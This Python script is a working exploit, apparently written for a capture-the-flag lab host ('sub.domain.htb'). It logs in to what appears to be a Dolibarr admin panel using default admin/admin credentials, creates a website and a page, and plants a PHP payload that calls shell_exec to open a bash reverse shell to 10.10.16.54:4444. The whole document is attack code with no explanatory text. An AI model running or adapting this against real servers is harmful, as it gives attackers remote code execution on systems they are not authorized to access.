from datetime import datetime
from bs4 import BeautifulSoup as BS
import requests
import random
import string


class Routes:
    BASE = 'http://sub.domain.htb'
    LOGIN = BASE + '/index.php'
    CREATE = BASE + '/website/index.php'


IP = '10.10.16.54'
PORT = '4444'
USERNAME = 'admin'
PASSWORD = 'admin'

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))


def get_token(session):
    try:
        return (
            BS(session.get(Routes.LOGIN).text, 'html.parser')
            .find('meta', {'name': 'anti-csrf-newtoken'})
            ['content']
        )
    except:
        raise Exception("Coulnd't get csrf token...")


def login(session, token):
    data = dict(
        token=token,
        actionlogin='login',
        loginfunction='loginfunction',
        username=USERNAME,
        password=PASSWORD
    )
    session.post(Routes.LOGIN, params={'mainmenu': 'home'}, data=data)


def create_website(session, token, website):
    data = dict(
        token=(None, token),
        backtopage=(None, ''),
        dol_openinpopup=(None, ''),
        action=(None, 'addsite'),
        website=(None, 'sgsg'),
        pageid=(None, random.randint(100, 1000)),
        WEBSITE_REF=(None, website),
        WEBSITE_LANG=(None, 'en'),
        WEBSITE_OTHERLANG=(None, ''),
        WEBSITE_DESCRIPTION=(None, ''),
        virtualhost=(None, ''),
        addcontainer=(None, 'Create')
    )
    session.post(Routes.CREATE, files=data)


def create_page(session, token, website, page):
    year, month, day = str(datetime.now().date()).split('-')
    data = dict(
        token=(None, token),
        backtopage=(None, ''),
        dol_openinpopup=(None, ''),
        action=(None, 'addcontainer'),
        website=(None, website),
        pageidbis=(None, '-1'),
        pageid=(None, ''),
        radiocreatefrom=(None, 'checkboxcreatemanually'),
        WEBSITE_TYPE_CONTAINER=(None, 'page'),
        sample=(None, 'empty'),
        WEBSITE_TITLE=(None, page),
        WEBSITE_PAGENAME=(None, page),
        WEBSITE_ALIASALT=(None, ''),
        WEBSITE_DESCRIPTION=(None, ''),
        WEBSITE_IMAGE=(None, ''),
        WEBSITE_KEYWORDS=(None, ''),
        WEBSITE_LANG=(None, '0'),
        WEBSITE_AUTHORALIAS=(None, ''),
        datecreation=(None, f'{month}/{day}/{year}'),
        datecreationday=(None, day),
        datecreationmonth=(None, month),
        datecreationyear=(None, year),
        datecreationhour=(None, 11),
        datecreationmin=(None, 11),
        datecreationsec=(None, 11),
        htmlheader_x=(None, ''),
        htmlheader_y=(None, ''),
        htmlheader=(None, ''),
        addcontainer=(None, 'Create'),
        externalurl=(None, ''),
        grabimages=(None, '1'),
        grabimagesinto=(None, 'root'),
    )
    session.post(Routes.CREATE, files=data)


def edit_page(session, website):
    payload = f'''
    <?PHP shell_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
    '''
    data = dict(
        token=(None, token),
        backtopage=(None, ''),
        dol_openinpopup=(None, ''),
        action=(None, 'updatesource'),
        website=(None, website),
        pageid=(None, '1'),
        update=(None, 'Save'),
        PAGE_CONTENT_x=(None, '100'),
        PAGE_CONTENT_y=(None, '100'),
        PAGE_CONTENT=(None, payload)
    )
    session.post(Routes.CREATE, files=data)


with requests.Session() as session:
    proxies = {
        'http': '127.0.0.1:8080'
    }
    session.proxies = proxies

    token = get_token(session)
    print(f'[+] Token: {token}')

    login(session, token)
    print(f'[+] Login Success!')

    website = random_string()
    create_website(session, token, website)
    print(f'[+] Website Created!')

    page = random_string()
    create_page(session, token, website, page)
    print(f'[+] Page Created!')

    edit_page(session, website)
    print(f'[+] Payload Injected!')